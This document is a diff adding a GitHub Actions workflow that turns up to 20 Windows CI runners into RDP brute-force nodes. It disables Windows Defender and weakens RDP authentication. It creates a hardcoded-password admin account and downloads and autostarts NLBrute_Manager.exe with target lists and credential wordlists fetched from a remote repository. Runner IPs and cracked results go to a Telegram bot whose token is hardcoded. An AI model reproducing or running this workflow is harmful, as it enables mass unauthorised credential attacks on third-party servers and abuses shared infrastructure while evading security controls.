@@ -1,1 +1,292 @@
+name: Mass Server Deployment (Single File Mode)
 
+on:
+  workflow_dispatch:
+    inputs:
+      total_servers:
+        description: 'How many servers to launch? (e.g. 10, 20)'
+        required: true
+        default: '10'
+
+jobs:
+  deploy:
+    strategy:
+      matrix:
+        server_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+      fail-fast: false
+
+    runs-on: windows-latest
+    timeout-minutes: 360
+
+    steps:
+      - name: 1. Checkout Repo
+        uses: actions/checkout@v4
+
+      - name: 2. Setup Workspace & Validate Input
+        shell: powershell
+        run: |
+          $maxServers = [int]${{ github.event.inputs.total_servers }}
+          $currentId = ${{ matrix.server_id }}
+          $workDir = "C:\target_app"
+          $tempDir = "C:\split_data"
+
+          if ($currentId -gt $maxServers) {
+              Write-Host "!!! LIMIT REACHED: Skipping Server ID $currentId !!!" -ForegroundColor Yellow
+              exit 0
+          }
+
+          # Create clean workspace and a dedicated temp folder for the split file
+          if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
+          if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
+          New-Item -ItemType Directory -Path $workDir -Force | Out-Null
+          New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+          
+          echo "SERVER_ID=$currentId" >> $env:GITHUB_ENV
+          echo "MAX_SERVERS=$maxServers" >> $env:GITHUB_ENV
+          echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
+          echo "TEMP_DIR=$tempDir" >> $env:GITHUB_ENV
+          
+          Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan
+
+      - name: 3. Split servers.txt & Fetch Config Files
+        shell: powershell
+        run: |
+          $maxServers = [int]$env:MAX_SERVERS
+          $currentId = [int]$env:SERVER_ID
+          $inputFile = "${{ github.workspace }}\servers.txt" 
+          $outputFile = "$($env:TEMP_DIR)\servers.txt"
+
+          # --- NEW: Fetch remote config files ---
+          $remoteUserUrl = "https://raw.githubusercontent.com/xianfrankz1/am/refs/heads/main/.github/workflows/user.txt"
+          $remotePassUrl = "https://raw.githubusercontent.com/xianfrankz1/am/refs/heads/main/.github/workflows/pass.txt"
+          $tempUserFile = "$($env:TEMP_DIR)\user.txt"
+          $tempPassFile = "$($env:TEMP_DIR)\pass.txt"
+
+          Write-Host "Downloading remote user.txt and pass.txt..." -ForegroundColor Cyan
+          try {
+              Invoke-WebRequest -Uri $remoteUserUrl -OutFile $tempUserFile
+              Invoke-WebRequest -Uri $remotePassUrl -OutFile $tempPassFile
+              Write-Host "Remote config files downloaded successfully." -ForegroundColor Green
+          } catch {
+              Write-Error "Failed to download remote config files. Check URLs."
+              exit 1
+          }
+          # --------------------------------------
+
+          Write-Host "Reading master file from: $inputFile" -ForegroundColor Cyan
+          
+          if (!(Test-Path $inputFile)) {
+              Write-Error "CRITICAL: servers.txt not found in repository root!"
+              exit 1
+          }
+
+          $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
+          $totalLines = $allLines.Count
+          
+          if ($totalLines -eq 0) { exit 1 }
+
+          $linesPerServer = [Math]::Floor($totalLines / $maxServers)
+          $startIndex = ($currentId - 1) * $linesPerServer
+          
+          $countToTake = $linesPerServer
+          if ($currentId -eq $maxServers) {
+              $countToTake = $totalLines - $startIndex
+          }
+
+          Write-Host "Server ${currentId}: Extracting ${countToTake} lines..." -ForegroundColor Cyan
+
+          $serverLines = $allLines | Select-Object -Skip $startIndex -First $countToTake
+
+          if ($null -eq $serverLines -or $serverLines.Count -eq 0) {
+              Write-Error "No data found for Server ${currentId}."
+              exit 1
+          }
+
+          # Save the split file to a TEMPORARY directory to avoid collision during extraction
+          $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
+          Write-Host "Split file saved to temporary location: $outputFile" -ForegroundColor Green
+
+      - name: 4. Enable RDP & Firewall
+        run: |
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
+
+      - name: 5. Create Admin Account
+        run: |
+          $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
+          New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
+          Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
+          net user runneradmin P@ssw0rd1qazXSW@#
+
+      - name: 6. Install & Connect Tailscale VPN
+        env:
+          TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
+        run: |
+          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
+          Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
+          Start-Sleep -Seconds 5
+          & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
+          Start-Sleep -Seconds 8
+          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
+          if (-not $ts_ip) {
+              Write-Error "Failed to get Tailscale IP"
+              exit 1
+          }
+          # Save IP to environment for the next step
+          echo "TS_IP=$ts_ip" >> $env:GITHUB_ENV
+          Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
+
+      - name: 6.5. Send Tailscale IP to Telegram
+        env:
+          TS_IP: ${{ env.TS_IP }}
+          MATRIX_ID: ${{ matrix.server_id }}
+        shell: bash
+        run: |
+          set -e
+
+          # Your Telegram Credentials
+          CHAT_ID="7565155789"
+          BOT_TOKEN="8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
+          IP="$TS_IP"
+          MSG="🖥️ <b>Server $MATRIX_ID Online</b>\nIP: <code>$IP</code>\nTime: $(date)"
+
+          if [ -z "$IP" ]; then
+            echo "ERROR: TS_IP is empty. Cannot proceed."
+            exit 1
+          fi
+
+          echo "Sending to Telegram..."
+          RESPONSE=$(curl -sS -w "\n%{http_code}" \
+            -X POST \
+            "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+            -H "Content-Type: application/json" \
+            -d "{\"chat_id\": \"$CHAT_ID\", \"text\": \"$MSG\", \"parse_mode\": \"Markdown\"}")
+
+          HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
+          BODY=$(echo "$RESPONSE" | sed '$d')
+
+          if [ "$HTTP_CODE" -eq 200 ]; then
+            echo "Successfully sent IP to Telegram."
+            echo "Response: $BODY"
+          else
+            echo "ERROR: Telegram send failed with status $HTTP_CODE"
+            echo "Response Body: $BODY"
+            exit 1
+          fi
+
+      - name: 7. Deploy App & Setup Autostart
+        shell: powershell
+        run: |
+          # 1. Disable Security
+          Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
+          Set-MpPreference -DisableRealtimeMonitoring $true
+          Set-MpPreference -DisableIOAVProtection $true
+          Set-MpPreference -DisableBehaviorMonitoring $true
+          Set-MpPreference -DisableScriptScanning $true
+
+          # 2. Download Files
+          $filesToDownload = @(
+            "https://raw.githubusercontent.com/xianfrankz1/am/main/multinl_zip.z01",
+            "https://raw.githubusercontent.com/xianfrankz1/am/main/multinl_zip.z02",
+            "https://raw.githubusercontent.com/xianfrankz1/am/main/multinl_zip.z03",
+            "https://raw.githubusercontent.com/xianfrankz1/am/main/multinl_zip.zip"
+          )
+
+          Write-Host "Downloading files..." -ForegroundColor Yellow
+          foreach ($url in $filesToDownload) {
+              $fileName = Split-Path $url -Leaf
+              Invoke-WebRequest -Uri $url -OutFile "$($env:WORK_DIR)\$fileName"
+          }
+
+          # 3. Extraction
+          Write-Host "Starting Extraction..." -ForegroundColor Cyan
+          $maxIterations = 5
+          $iteration = 0
+          $foundZip = $true
+
+          while ($foundZip -and $iteration -lt $maxIterations) {
+              $iteration++
+              $zips = Get-ChildItem -Path $env:WORK_DIR -Filter "*.zip" -Recurse
+              if ($zips.Count -eq 0) { $foundZip = $false } 
+              else {
+                  foreach ($zip in $zips) {
+                      $targetFolder = $zip.DirectoryName
+                      & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
+                      Start-Sleep -Seconds 3
+                  }
+                  $foundZip = $true 
+              }
+          }
+
+          # 4. AGGRESSIVE INJECTION: Find EXE and Force Overwrite servers.txt
+          Write-Host "Locating application files to inject split servers.txt..." -ForegroundColor Cyan
+          $targetExe1 = "NLBrute_Manager.exe"
+          $targetExe2 = "good.txt-monitor.exe"
+          $splitFileSource = "$($env:TEMP_DIR)\servers.txt"
+          
+          # NEW: Paths for remote config files
+          $userFileSource = "$($env:TEMP_DIR)\user.txt"
+          $passFileSource = "$($env:TEMP_DIR)\pass.txt"
+
+          $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+          $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+
+          # Function to force-inject the files
+          function Force-Inject-Files($exeFile, $sourceFiles) {
+              if ($exeFile) {
+                  $exeDir = $exeFile.DirectoryName
+                  
+                  Write-Host "Targeting EXE Directory: $exeDir" -ForegroundColor Cyan
+                  
+                  foreach ($sourceFile in $sourceFiles) {
+                      $fileName = Split-Path $sourceFile -Leaf
+                      $destinationFile = Join-Path $exeDir $fileName
+                      
+                      Write-Host "Injecting: $fileName -> $destinationFile" -ForegroundColor Yellow
+                      
+                      if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
+                      
+                      Copy-Item -Path $sourceFile -Destination $destinationFile -Force
+                  }
+                  Write-Host "Injection Successful!" -ForegroundColor Green
+              }
+          }
+
+          # Define the files to inject (Split servers + Remote user/pass)
+          $filesToInject = @($splitFileSource, $userFileSource, $passFileSource)
+
+          Force-Inject-Files -exeFile $exeFile1 -sourceFiles $filesToInject
+          Force-Inject-Files -exeFile $exeFile2 -sourceFiles $filesToInject
+
+          # 5. Registry & Autostart Setup
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+          # APP 1 Setup
+          if ($exeFile1) {
+              $exePath1 = $exeFile1.FullName
+              $exeDir1 = Split-Path $exePath1 -Parent
+              $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
+              $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
+              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
+              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
+              Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
+          }
+
+          # APP 2 Setup
+          if ($exeFile2) {
+              $exePath2 = $exeFile2.FullName
+              $exeDir2 = Split-Path $exePath2 -Parent
+              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
+              $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
+              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
+              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
+              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
+          }
+
+      - name: 8. Keep Server Alive (6 Hours)
+        run: |
+          for ($i = 1; $i -le 360; $i++) {
+            Start-Sleep -Seconds 60
+            Write-Host "[Server ${{ matrix.server_id }}] Running..."
+          }
